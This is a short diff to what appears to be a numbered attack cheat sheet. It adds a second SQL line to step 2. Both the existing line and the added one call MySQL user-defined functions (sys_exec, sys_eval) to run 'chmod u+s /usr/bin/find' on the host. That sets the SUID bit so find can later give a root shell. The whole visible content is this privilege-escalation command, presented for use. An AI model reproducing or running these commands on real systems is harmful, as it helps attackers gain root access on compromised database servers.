@@ -9,6 +9,7 @@
 #### 2) 
 
     SELECT sys_exec('chmod u+s /usr/bin/find');
+    SELECT sys_eval('chmod u+s /usr/bin/find');
 
 #### 3) 
 
